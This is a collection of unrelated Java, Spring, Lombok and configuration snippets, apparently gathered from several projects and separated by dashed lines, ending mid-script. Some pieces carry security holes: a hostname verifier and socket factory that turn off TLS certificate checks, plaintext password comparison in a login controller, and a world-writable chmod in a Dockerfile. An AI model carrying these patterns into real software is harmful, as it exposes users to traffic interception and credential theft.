com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.description = Format without decimal dates
com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.name = Format without decimal

com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.number.description = Number to be formatted
com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.number.name = Number

com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.prefix.description = Number Prefix
com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.prefix.name = Prefix to be used before the number

com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.suffix.description = Number Suffix
com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.suffix.name = Suffix to be used before the number

com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.description = Format without decimal dates
com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.name = Format without decimal

com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.number.description = Number to be formatted
com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.number.name = Number

com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.scale.description = Scale
com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.scale.name = Fixs to be used in format

com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.prefix.description = Number Prefix
com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.prefix.name = Prefix to be used before the number

com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.suffix.description = Number Suffix
com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.suffix.name = Suffix to be used before the number

com.fred.functions.FredCustomFunctions.name=Fred Custom Functions
com.fred.functions.FredCustomFunctions.description=Custon functions
--------------------------------------------------------------------------------------------------------
    @Override
    public boolean equals(final Object other) {
	if (!(other instanceof PessoaJuridica)) {
	    return false;
	}
	PessoaJuridica castOther = (PessoaJuridica) other;
	return new EqualsBuilder().append(nomeFantasia, castOther.nomeFantasia)
		.append(razaoSocial, castOther.razaoSocial).append(cnpj, castOther.cnpj)
		.append(inscricaoEstadual, castOther.inscricaoEstadual).isEquals();
    }

    @Override
    public int hashCode() {
	return new HashCodeBuilder().append(nomeFantasia).append(razaoSocial).append(cnpj).append(inscricaoEstadual)
		.toHashCode();
    }
--------------------------------------------------------------------------------------------------------
import com.edu.fatecbt.sistema.controle.AppUrls;
import com.edu.fatecbt.sistema.controle.ServletBase;
import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(name = "LoginServlet", urlPatterns = {AppUrls.USUARIO_LOGIN})
public class LoginServlet extends ServletBase {

    private UsuarioService service;

    @Override
    public void init() throws ServletException {
        super.init();
        service = new UsuarioService();
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String login = request.getParameter("login");
        String senha = request.getParameter("senha");
        boolean ehUsuarioLogado = service
                .ehUsuarioLogado(login, senha, request.getSession());
        if (ehUsuarioLogado) {
            redirect("/main", response);
        } else {
            request.getSession().setAttribute("errorMessage", "Usuário não autenticado");
            redirect("/index.jsp", response);
        }
    }

}
--------------------------------------------------------------------------------------------------------
private void exercise7() throws IOException {
		try (BufferedReader reader = Files.newBufferedReader(Paths.get("SonnetI.txt"), StandardCharsets.UTF_8)) {
			/* YOUR CODE HERE */
			reader.lines()
				.flatMap(l -> Stream.of(l.split(WORD_REGEXP)))
				.distinct()
				.map(String::toLowerCase)
				.sorted((a,b) -> Integer.compare(a.length(), b.length()))
				.collect(Collectors.toList())
				.forEach(System.out::println);
		}
	}

--------------------------------------------------------------------------------------------------------
# Add project specific ProGuard rules here.
# You can control the set of applied configuration files using the
# proguardFiles setting in build.gradle.
#
# For more details, see
#   http://developer.android.com/guide/developing/tools/proguard.html

# If your project uses WebView with JS, uncomment the following
# and specify the fully qualified class name to the JavaScript interface
# class:
#-keepclassmembers class fqcn.of.javascript.interface.for.webview {
#   public *;
#}

# Uncomment this to preserve the line number information for
# debugging stack traces.
#-keepattributes SourceFile,LineNumberTable

# If you keep the line number information, uncomment this to
# hide the original source file name.
#-renamesourcefileattribute SourceFile
--------------------------------------------------------------------------------------------------------
import com.leonardoz.select_html.parser.ast.projection.*;

public class ProjectionResultExtractorListener implements ExtractorListener {

    private ProjectionResult result;

    public ProjectionResultExtractorListener() {
        result = new ProjectionResult();
    }

    @Override
    public void onTagCreated(Tag tag) {
        result.setTag(tag);
    }

    @Override
    public void onTagAttributesCreated(TagAttributes tagAttributes) {
        result.setTagAttributes(tagAttributes);
    }

    @Override
    public void onTagClassesCreated(TagClasses tagClasses) {
        result.setTagClasses(tagClasses);
    }

    @Override
    public void onTagIdCreated(TagId tagId) {
        result.setTagId(tagId);
    }

    @Override
    public void onTagHTMLCreated(TagHTML tagHTML) {
        result.setTagHtml(tagHTML);
    }

    @Override
    public void onTagTextCreated(TagText tagText) {
        result.setTagText(tagText);
    }

    public ProjectionResult getResult() {
        return result;
    }
}
--------------------------------------------------------------------------------------------------------
	@ManyToOne(optional = false)
	@JoinColumn(name = "id_autor")
	private Autor autor;

	@NotEmpty
	@Size(min = 1, max = 140)
	@Column(length = 140, nullable = false, name = "titulo")
	private String titulo;

	@NotEmpty
	@Size(min = 1)
	@Column(columnDefinition = "text", nullable = false, name = "conteudo")
	private String conteudo;

	@Temporal(TemporalType.TIMESTAMP)
	@Column(name = "data")
	private Date data;

	@NotEmpty
	@ManyToMany(cascade = { CascadeType.MERGE, CascadeType.PERSIST,
			CascadeType.REFRESH })
	@JoinTable(name = "post_categoria", joinColumns = @JoinColumn(name = "id_post"), inverseJoinColumns = @JoinColumn(name = "id_categoria"))
	private List<Categoria> categorias;

	@OneToMany(mappedBy = "post")
	private List<Comentario> comentarios;
	
	@NotEmpty
	@Size(max = 12)
	@Column(length = 12, nullable = false, unique = true, name = "nick")
	private String nick;

	@NotEmpty
	@Size(max = 40)
	@Column(length = 40, nullable = false, name = "nome_completo")
	private String nomeCompleto;

	@NotEmpty
	@Email
	@Column(length = 35, nullable = false, unique = true, name = "email")
	private String email;

	@NotEmpty
	@Size(min = 3, max = 64)
	@Column(length = 64, nullable = false, name = "hash_senha")
	private String hashSenha;

	@Temporal(TemporalType.DATE)
	@Column(nullable = false, name = "cadastrado")
	private Date cadastrado;
--------------------------------------------------------------------------------------------------------
docker-compose.yml

version: '3'

services:
  app:
    container_name: blogleo_app
    restart: always
    build: 
      context: ../
      dockerfile: ./docker/SpringDockerfile 
    working_dir: /app
    networks: 
      - backend
    volumes:
      - ../:/app
      - ~/.m2:/root/.m2
    ports:
      - 8080:8080
    stdin_open: true
    tty: true
    entrypoint: 
      - bash 
      - -c
      - |
          mvn package 
          sh target/bin/blogleo
    depends_on:
      - mysql_db

  mysql_db:
    container_name: blogleo_db
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: 'blogpass'
      MYSQL_DATABASE: 'blogleo'
      MYSQL_USER: 'user'
      MYSQL_PASSWORD: 'blogpass'
    networks:
      - backend
    volumes:
      - ./mysql-data/:/var/lib/mysql
      - ./mysql-conf/:/docker-entrypoint-initdb.d
    ports:
     - "3306:3306"
     
networks:
  backend:
    driver: bridge
--------------------------------------------------------------------------------------------------------
import java.net.URL;
import java.time.Duration;
import java.time.Instant;

import lombok.EqualsAndHashCode;
import lombok.Getter;
import lombok.NonNull;
import lombok.RequiredArgsConstructor;
import lombok.experimental.Accessors;

@RequiredArgsConstructor
@Accessors(fluent = true) @Getter
@EqualsAndHashCode(of = {"authToken"})
public class LoginResult {

    private final @NonNull Instant loginTs;

    private final @NonNull String authToken;
    private final @NonNull Duration tokenValidity;

    private final @NonNull URL tokenRefreshUrl;

}
--------------------------------------------------------------------------------------------------------
import lombok.AccessLevel;
import lombok.Getter;
import lombok.NoArgsConstructor;
import lombok.Setter;
import lombok.ToString;
import lombok.experimental.Delegate;

@Entity
@Getter @Setter @NoArgsConstructor // <--- THIS is it
@ToString(exclude = {"events"})
public class User implements Serializable, HasContactInformation {

    private @Id @Setter(AccessLevel.PROTECTED) Long id; // will be set when persisting

    private String nickname;

    // Whichever other User-specific attributes

    @Delegate(types = {HasContactInformation.class})
    private final ContactInformationSupport contactInformation = new ContactInformationSupport();

    // User itelf will implement all contact information by delegation

    @OneToMany(mappedBy = "user")
    private List<UserEvent> events;

    public User(String nickname, String firstName, String lastName, String phoneNr) {
        this.nickname = nickname;
        contactInformation.setFirstName(firstName);
        contactInformation.setLastName(lastName);
        contactInformation.setPhoneNr(phoneNr);
    }

}

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.stream.Collectors;

import lombok.SneakyThrows;
import lombok.Synchronized;

public class Utility {

    @SneakyThrows
    public String resourceAsString() throws IOException {
        try (InputStream is = this.getClass().getResourceAsStream("sure_in_my_jar.txt")) {
            BufferedReader br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
            return br.lines().collect(Collectors.joining("\n"));
        } 
    }

    @Synchronized
    public void putValueInCache(String key, String value) {
        System.out.println("Thread safe here with key : [" + key + "] and value[" + value + "]");
    }
}

import lombok.Builder;
import lombok.Getter;

@Getter
public class Student extends Child {

    private final String schoolName;

    @Builder(builderMethodName = "studentBuilder")
    public Student(String parentName, int parentAge, String childName, int childAge, String schoolName) {
        super(parentName, parentAge, childName, childAge);
        this.schoolName = schoolName;
    }
}
import java.util.List;
import lombok.Builder;
import lombok.Getter;
import lombok.Singular;

@Getter
@Builder
public class Sea {

    @Singular private final List<String> grasses;
    @Singular("oneFish") private final List<String> fish;
}
--------------------------------------------------------------------------------------------------------
@OverridesAttribute(constraint = Size.class, name = "min")
@OverridesAttribute(constraint = Size.class, name = "max")
int size() default 5;
@OverridesAttribute(constraint = Size.class, name = "message")
String sizeMessage() default "A french zip code has a length of 5";
@OverridesAttribute(constraint = Pattern.class, name = "regexp", constraintIndex = 1)
String regex() default "\\d*";
--------------------------------------------------------------------------------------------------------
import lombok.Builder;
import lombok.Getter;
import lombok.Singular;

import java.time.LocalDate;
import java.util.Date;
import java.util.List;
import java.util.Map;
import java.util.Set;

@Getter
@Builder
public class Person {

    private final String givenName;
    private final String additionalName;
    private final String familyName;

    private final List<String> tags;
    @Singular private final List<String> interests;
    @Singular private final Set<String> skills;
    @Singular private final Map<String, LocalDate> awards;
}
--------------------------------------------------------------------------------------------------------
@Configuration
class ConnectionFactoryConfiguration {

	@Bean
	DatabaseClient databaseClient() {
		return DatabaseClient.create(connectionFactory());
	}

	@Bean
	public ConnectionFactory connectionFactory() {
		MssqlConnectionConfiguration config = MssqlConnectionConfiguration.builder() //
			.host("localhost")
			.port(1434)
			.database("pizza")
			.username("test")
			.password("test")
			.build();
		return new MssqlConnectionFactory(config);
	}
}
--------------------------------------------------------------------------------------------------------
@Repository
public class ManualPizzaRepository {

    private final ConnectionFactory connectionFactory;

    public ManualPizzaRepository(ConnectionFactory connectionFactory) {
        this.connectionFactory = connectionFactory;
    }

    Mono<Void> deleteById(Integer id) {
        return this.connection()
            .flatMapMany(c -> c.createStatement("delete from pizza where id = $1")
                .bind("$1", id)
                .execute())
            .then();
    }

    Flux<Pizza> findAll() {
        return this.connection()
            .flatMapMany(connection ->
                Flux.from(connection.createStatement("select * from pizza").execute())
                    .flatMap(r ->
                        r.map((row, rowMetadata) ->
                            new Pizza(row.get("id", Integer.class), row.get("flavor", String.class)))));
    }

    Flux<Pizza> save(Pizza pizza) {
        Flux<? extends Result> flux = this.connection().flatMapMany(conn -> conn.createStatement("insert into pizza (flavor) values ($1)")
            .bind("$1", pizza.getFlavor())
            .add()
            .execute());

        return flux.switchMap(x -> Flux.just(new Pizza(pizza.getId(), pizza.getFlavor())));
    }

    private Mono<Connection> connection() {
        return Mono.from(this.connectionFactory.create());
    }

}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@SpringBootTest(classes = {ConnectionFactoryConfiguration.class, ManualPizzaRepository.class})
public class ReactiveSqlSqlserverApplicationTests {

	@Autowired
	ManualPizzaRepository pizzas;

	@Autowired
	DatabaseClient databaseClient;

	@Test
	public void testAllManual() {
		Flux<Void> deleteAll = this.pizzas.findAll().flatMap(pizza -> this.pizzas.deleteById(pizza.getId()));
		StepVerifier.create(deleteAll).expectNextCount(0).verifyComplete();

		Flux<Pizza> savePizzas = Flux.just("Mozzarella", "Pepperoni", "Margherita")
			.map(flavor -> new Pizza(null, flavor))
			.flatMap(pizza -> this.pizzas.save(pizza));
		StepVerifier.create(savePizzas).expectNextCount(3).verifyComplete();

		Flux<Pizza> findAll = this.pizzas.findAll();
		StepVerifier.create(findAll).expectNextCount(3).verifyComplete();

	}
}
--------------------------------------------------------------------------------------------------------
/**
 * @author Guillaume Smet
 */
public class FrenchAddressListContainer extends Address {

  @Override
  @FrenchZipcodeListContainer
  public String getZipCode() {
    return super.getZipCode();
  }

  @NotEmpty
  @Size
  // first pattern just duplicates the length of 5 characters, the second pattern is just to prove that parameters can be overridden.
  @Pattern.List({ @Pattern(regexp = "....."), @Pattern(regexp = "bar") })
  @Constraint(validatedBy = FrenchZipcodeListContainerConstraintValidator.class)
  @Documented
  @Target({ METHOD, FIELD, TYPE })
  @Retention(RUNTIME)
  public @interface FrenchZipcodeListContainer {
    String message() default "Wrong zipcode";

    Class<?>[] groups() default { };

    Class<? extends Payload>[] payload() default {};

    @OverridesAttribute(constraint = Size.class, name = "min")
    @OverridesAttribute(constraint = Size.class, name = "max")
    int size() default 5;

    @OverridesAttribute(constraint = Size.class, name = "message")
    String sizeMessage() default "A french zip code has a length of 5";

    @OverridesAttribute(constraint = Pattern.class, name = "regexp", constraintIndex = 1)
    String regex() default "\\d*";
  }
}
--------------------------------------------------------------------------------------------------------
public final class WeightBean {
    @NotNull
    private Double txtWeight;  //Getter and setter.

    @AssertTrue
    public boolean getTxtWeightCheck() {
        return txtWeight > 0.1 && txtWeight < 0.9;
    }
}
--------------------------------------------------------------------------------------------------------
        this.objectMapper.registerModule(
                new SimpleModule("Axon-Jackson Module").addDeserializer(MetaData.class, new MetaDataDeserializer())
        );
--------------------------------------------------------------------------------------------------------
/**
 * Default IdentifierFactory implementation that uses generates random {@code java.util.UUID} based identifiers.
 * Although the performance of this strategy is not the best out there, it has native supported on all JVMs.
 * <p/>
 * This implementations selects a random identifier out of about 3 x 10<sup>38</sup> possible values, making the chance
 * to get a duplicate incredibly small.
 *
 * @author Allard Buijze
 * @since 1.2
 */
public class DefaultIdentifierFactory extends IdentifierFactory {

    /**
     * {@inheritDoc}
     * <p/>
     * This implementation creates identifiers based on pseudo-random UUIDs.
     */
    @Override
    public String generateIdentifier() {
        return UUID.randomUUID().toString();
    }
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@EnableMBeanExport(registration = RegistrationPolicy.IGNORE_EXISTING)
@ContextConfiguration(locations = "classpath:/META-INF/spring/insertion-read-order-test-context.xml")
public class JpaStorageEngineInsertionReadOrderTest {
--------------------------------------------------------------------------------------------------------
jdbc.driverclass=org.hsqldb.jdbcDriver
jdbc.url=jdbc:hsqldb:mem:addressbook
jdbc.username=sa
jdbc.password=
hibernate.sql.dialect=org.hibernate.dialect.HSQLDialect
hibernate.sql.generateddl=true
javax.schema.generation=drop-and-create
hibernate.sql.show=false

jdbc.driverclass=com.mysql.jdbc.Driver
jdbc.url=jdbc:mysql://localhost:3306/axon_benchmark?useUnicode=true&characterEncoding=utf8&characterSetResults=utf8&rewriteBatchedStatements=true
jdbc.username=build
jdbc.password=build
hibernate.sql.dialect=org.hibernate.dialect.MySQL5InnoDBDialect
javax.schema.generation=drop-and-create
hibernate.sql.show=false

jdbc.driverclass=com.mysql.jdbc.Driver
jdbc.url=jdbc:mysql://localhost:3306/axon?useUnicode=true&characterEncoding=utf8&characterSetResults=utf8
jdbc.username=build
jdbc.password=build
hibernate.sql.dialect=org.hibernate.dialect.MySQL5InnoDBDialect
hibernate.sql.generateddl=true
hibernate.sql.show=true
--------------------------------------------------------------------------------------------------------
            <plugins>
                <plugin>
                    <!--
                        Creates a report by running "mvn japicmp:cmp"
                        Note: you need to install the jars before running the japicmp command.
                    -->
                    <groupId>com.github.siom79.japicmp</groupId>
                    <artifactId>japicmp-maven-plugin</artifactId>
                    <version>0.9.3</version>
                    <configuration>
                        <oldVersion>
                            <dependency>
                                <groupId>${project.groupId}</groupId>
                                <artifactId>${project.artifactId}</artifactId>
                                <version>1.1.0.Final</version>
                            </dependency>
                        </oldVersion>
                        <newVersion>
                            <file>
                                <path>${project.build.directory}/${project.artifactId}-${project.version}.${project.packaging}</path>
                            </file>
                        </newVersion>
                        <parameter>
                            <onlyModified>true</onlyModified>
                        </parameter>
                    </configuration>
                </plugin>
            </plugins>
--------------------------------------------------------------------------------------------------------
FROM haskell:7.10.3
MAINTAINER Andrey Somov <public.somov@gmail.com>

ENV YAML_REF=YamlReference-0.10.0

RUN apt-get update && apt-get install -y \
   build-essential \
   ca-certificates \
   less            \
   netbase         \
   vim

# install YamlReference
ADD http://hackage.haskell.org/package/${YAML_REF}/${YAML_REF}.tar.gz ${YAML_REF}.tar.gz 
RUN tar xvzf ${YAML_REF}.tar.gz

# add yeast2html to PATH
ENV PATH=${PATH}:/${YAML_REF}

WORKDIR /${YAML_REF}
#RUN stack upgrade
RUN stack setup && stack init && stack build && stack install

RUN cp /root/.local/bin/yaml2yeast ./yaml2yeast -R
RUN chmod o=rwx --recursive /${YAML_REF}

CMD ["bash"]
--------------------------------------------------------------------------------------------------------
 public String toString()
  {
    return ToStringBuilder.reflectionToString(this, ToStringStyle.MULTI_LINE_STYLE);
  }
--------------------------------------------------------------------------------------------------------
    protected Class<?> getClassForName(String name) throws ClassNotFoundException {
        try {
            return Class.forName(name, true, Thread.currentThread().getContextClassLoader());
        } catch (ClassNotFoundException e) {
            return Class.forName(name);
        }
    }
--------------------------------------------------------------------------------------------------------
/* We need a constructor to tell SnakeYaml that the type parameter of
 * the 'name' List is String
 * (SnakeYAML cannot figure it out itself due to type erasure)
 */
Constructor constructor = new Constructor(Config.class);
TypeDescription configDesc = new TypeDescription(Config.class);
configDesc.putListPropertyType("name", String.class);
constructor.addTypeDescription(configDesc);

// Now we use our constructor to tell SnakeYAML how to load the YAML
Yaml yaml = new Yaml(constructor);
Config config = yaml.loadAs(in, Config.class);

// You can now easily access your strings
List<String> values = config.name;

class Config {
    public List<String> name;
}
--------------------------------------------------------------------------------------------------------
@Test
public void whenCollectorsJoining_thenPrintCustom() {
    List<Integer> intList = Arrays.asList(1, 2, 3);
    String result = intList.stream()
      .map(n -> String.valueOf(n))
      .collect(Collectors.joining("-", "{", "}"));
  
    System.out.println(result);
}
--------------------------------------------------------------------------------------------------------
package org.afc.petstore.ssl;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLSession;

public class AcceptAllHostnameVerifier implements HostnameVerifier {

	@Override
	public boolean verify(String hostname, SSLSession session) {
		return true;
	}
}
--------------------------------------------------------------------------------------------------------
package org.afc.petstore.ssl;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;

import org.springframework.cloud.commons.httpclient.OkHttpClientFactory;

public class SSLSocketFactoryUtil {

	public static SSLSocketFactory newAcceptAll() {
		try {
			TrustManager[] tm = new TrustManager[] { new OkHttpClientFactory.DisableValidationTrustManager() };
			SSLContext context = SSLContext.getInstance("TLS");
			context.init(null, tm, null);
			return context.getSocketFactory();
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
	}
}
--------------------------------------------------------------------------------------------------------
MetricsAutoConfiguration
philandro software

--------------------------------------------------------------------------------------------------------
package org.afc.petstore;

import org.afc.env.Environment;
import org.afc.util.ClasspathUtil;

public class PetstoreLocal {

	public static void main(String[] args) throws Exception {
		Environment.set("petstore", "local", "vi", "default", "vi1");
		ClasspathUtil.addSystemClasspath("target/config");
		Petstore.main(new String[] {"--spring.profiles.active=local,default,vi,vi1"});
	}
}
--------------------------------------------------------------------------------------------------------
git branch -D PBA-4653
https://global-hotspot.ru/wi-fi-targeting-reklamy/
https://target.my.com/
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class) 
@ContextConfiguration(classes = AppConfig.class)
@WebAppConfiguration
public class SpringTest {
}
--------------------------------------------------------------------------------------------------------
@Configuration
@ConditionalOnClass(Flyway.class)
@ConditionalOnBean(DataSource.class)
@ConditionalOnExpression("${flyway.enabled:true}")
@AutoConfigureAfter(DataSourceAutoConfiguration.class)
public class FlywayAutoConfiguration {

    @Configuration
    @ConditionalOnMissingBean(Flyway.class)
    @EnableConfigurationProperties(FlywayProperties.class)
    @Import(FlywayJpaDependencyConfiguration.class)
    public static class FlywayConfiguration {
--------------------------------------------------------------------------------------------------------

2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
package com.spring.configuration;
 
import org.hibernate.SessionFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.*;
import org.springframework.core.env.Environment;
import org.springframework.jdbc.datasource.DriverManagerDataSource;
import org.springframework.orm.hibernate5.HibernateTransactionManager;
import org.springframework.orm.hibernate5.LocalSessionFactoryBean;
import org.springframework.transaction.annotation.EnableTransactionManagement;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;
import org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;
import org.springframework.web.servlet.view.InternalResourceViewResolver;
import org.springframework.web.servlet.view.JstlView;
 
import javax.sql.DataSource;
import java.util.Properties;
 
@Configuration
@EnableWebMvc  //здесь
@EnableTransactionManagement
@ComponentScan(
        basePackages = { "com.spring" },
        excludeFilters = { @ComponentScan.Filter(
                type = FilterType.ANNOTATION,
                value = Configuration.class)}
)
@PropertySource(value = {"classpath:application.properties"})
public class WebConfiguration extends WebMvcConfigurerAdapter {
    @Autowired
    private Environment environment;
 
    @Override  //ну или здесь
    public void addResourceHandlers(ResourceHandlerRegistry registry) {
        registry.addResourceHandler("/resources/**").addResourceLocations("/resources/");
    }
 
    @Bean
    public InternalResourceViewResolver setupViewResolver() {
        InternalResourceViewResolver resolver = new InternalResourceViewResolver();
        resolver.setPrefix("/WEB-INF/views/");
        resolver.setSuffix(".jsp");
        resolver.setViewClass(JstlView.class);
 
        return resolver;
    }
 
    @Bean
    public LocalSessionFactoryBean sessionFactory() {
        LocalSessionFactoryBean sessionFactory = new LocalSessionFactoryBean();
        sessionFactory.setDataSource(dataSource());
        sessionFactory.setPackagesToScan("com.spring.model");  //new String[] { "com.spring.model" }
        sessionFactory.setHibernateProperties(hibernateProperties());
        return sessionFactory;
    }
 
    @Bean
    public DataSource dataSource() {
        DriverManagerDataSource dataSource = new DriverManagerDataSource();
        dataSource.setDriverClassName(environment.getRequiredProperty("jdbc.driverClassName"));
        dataSource.setUrl(environment.getRequiredProperty("jdbc.url"));
        dataSource.setUsername(environment.getRequiredProperty("jdbc.username"));
        dataSource.setPassword(environment.getRequiredProperty("jdbc.password"));
        return dataSource;
    }
 
    private Properties hibernateProperties() {
        Properties properties = new Properties();
        properties.put("hibernate.dialect", environment.getRequiredProperty("hibernate.dialect"));
        properties.put("hibernate.show_sql", environment.getRequiredProperty("hibernate.show_sql"));
        properties.put("hibernate.format_sql", environment.getRequiredProperty("hibernate.format_sql"));
        properties.put("hibernate.hbm2ddl.auto", "update");
        properties.put(
                "log4j.logger.org.hibernate.SQL",
                environment.getRequiredProperty("log4j.logger.org.hibernate.SQL")
        );
        properties.put(
                "log4j.logger.org.hibernate.type",
                environment.getRequiredProperty("log4j.logger.org.hibernate.type")
        );
        return properties;
    }
 
    @Bean
    @Autowired
    public HibernateTransactionManager transactionManager(SessionFactory s) {
        HibernateTransactionManager txManager = new HibernateTransactionManager();
        txManager.setSessionFactory(s);
        return txManager;
    }
}

<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <packaging>war</packaging>
 
    <groupId>com</groupId>
    <artifactId>Traveler</artifactId>
    <version>1.0</version>
 
    <name>Traveler</name>
 
    <properties>
        <springframework.version>4.3.8.RELEASE</springframework.version>
        <hibernate.version>5.2.9.Final</hibernate.version>
    </properties>
 
    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-war-plugin</artifactId>
                <configuration>
                    <failOnMissingWebXml>false</failOnMissingWebXml>
                </configuration>
            </plugin>
        </plugins>
    </build>
 
    <dependencies>
        <!-- Servlet -->
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>javax.servlet-api</artifactId>
            <version>4.0.0-b05</version>
        </dependency>
 
        <!-- JSTL -->
        <dependency>
            <groupId>jstl</groupId>
            <artifactId>jstl</artifactId>
            <version>1.2</version>
        </dependency>
 
        <!-- Spring -->
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-core</artifactId>
            <version>${springframework.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-orm</artifactId>
            <version>${springframework.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-context</artifactId>
            <version>${springframework.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-webmvc</artifactId>
            <version>${springframework.version}</version>
        </dependency>
 
        <!-- Hibernate -->
        <dependency>
            <groupId>org.hibernate</groupId>
            <artifactId>hibernate-core</artifactId>
            <version>${hibernate.version}</version>
        </dependency>
        <dependency>
            <groupId>org.hibernate</groupId>
            <artifactId>hibernate-entitymanager</artifactId>
            <version>${hibernate.version}</version>
        </dependency>
 
        <!-- MySQL -->
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>5.1.40</version>
        </dependency>
    </dependencies>
 
 
 
</project>

package com.spring.controller;
 
import com.spring.configuration.WebConfiguration;
import com.spring.model.Place;
import com.spring.model.User;
import com.spring.service.PlaceService;
import com.spring.service.UserService;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;
import org.springframework.context.support.AbstractApplicationContext;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.servlet.ModelAndView;
 
import java.util.ArrayList;
 
@Controller
public class HomeController {
    @RequestMapping(value = "/", method = RequestMethod.GET)
    public ModelAndView home() {
        ModelAndView modelAndView = new ModelAndView();
        modelAndView.addObject("user", new User());
        modelAndView.setViewName("index");
 
        return modelAndView;
    }
 
    @RequestMapping(value = "/reg", method = RequestMethod.POST)
    public ModelAndView reg(@ModelAttribute("user") User user) {
        AbstractApplicationContext context = new AnnotationConfigApplicationContext(WebConfiguration.class);
        ModelAndView modelAndView = new ModelAndView();
        UserService service = (UserService) context.getBean("userService");
 
        modelAndView.setViewName("registration");
        modelAndView.addObject("user", user);
        service.saveUser(user);
 
        context.close();
        return modelAndView;
    }
 
    @RequestMapping(value = "/reg", method = RequestMethod.GET)
    public ModelAndView authorization(@ModelAttribute("user") User user) {
        AbstractApplicationContext context = new AnnotationConfigApplicationContext(WebConfiguration.class);
        ModelAndView modelAndView = new ModelAndView();
        UserService service = (UserService) context.getBean("userService");
 
        modelAndView.addObject("user", user);
 
        if (service.findByLogin(user.getLogin()) != null)
        {
            if (service.findByLogin(user.getLogin()).getPassword().equals(user.getPassword()))
                modelAndView.setViewName("authorization");
            else
                modelAndView.setViewName("authorizeFail");
        }
        else
        modelAndView.setViewName("authorizeFail");
 
        context.close();
        return modelAndView;
    }
 
    @RequestMapping(value = "/list", method = RequestMethod.GET)
    public ModelAndView list(@ModelAttribute("user") User user, @ModelAttribute("list") ArrayList<Place> list) {
        AbstractApplicationContext context = new AnnotationConfigApplicationContext(WebConfiguration.class);
        PlaceService service = (PlaceService) context.getBean("placeService");
 
        ModelAndView modelAndView = new ModelAndView();
        modelAndView.addObject("user", user);
        list = (ArrayList<Place>) service.findAllPlaces();
        modelAndView.addObject("list", list);
        modelAndView.setViewName("list");
 
        context.close();
        return modelAndView;
    }
}
--------------------------------------------------------------------------------------------------------
# The shell script to start the mock service as a daemon process 
# add -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1044  in the java command below
# to start the mocksy in debug mode

################################ Configurations ######################################

# give the rules file path here
RULES_FILE_PATH=src/test/rules/xml/rules.xml

# configure the port you want the mocksy to run
PORT=7890


############################## Start script - DO NOT EDIT ############################

nohup java -jar target/mocksy-server-0.8-full.jar  --admin --port $PORT --ruleset $RULES_FILE_PATH >>nohup.out 2>&1 &
sleep 2

echo 		
if grep "Unable to access jarfile" nohup.out &> /dev/null; 
then
        echo "mocksy jar not found .. please build the project before starting"
        rm nohup.out	
        
elif tail -12 nohup.out | grep "java.net.BindException: Address already in use" &> /dev/null;
then
		kill -9 $! &> /dev/null # this kills the process which failed to start completely due to the port clash
    	echo $PORT "already in use...pls edit start.sh to start on a different PORT"
    	
elif grep "java.lang.IllegalArgumentException" nohup.out &> /dev/null;
then
